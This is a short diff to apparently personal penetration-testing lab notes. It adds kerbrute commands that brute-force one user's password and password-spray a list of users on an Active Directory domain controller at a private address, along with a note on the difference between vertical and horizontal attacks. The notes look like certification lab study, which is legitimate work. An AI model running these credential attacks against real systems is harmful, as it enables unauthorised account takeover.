@@ -4,5 +4,10 @@
 ./kerbrute bruteuser -d ECC.LOCALNET --dc 172.25.170.80 Passwords.txt cpent (test with each user one by one that is enumrated above)
 
 
+noet:
+##bruteuser (Vertical attack): Takes one user and tests many passwords against it.
 
+##passwordspray (Horizontal attack): Takes one password and tests it against many users.
+
+./kerbrute passwordspray -d ECC.LOCALNET --dc 172.25.170.80 Userlist.txt Pa$$w0rd123
 
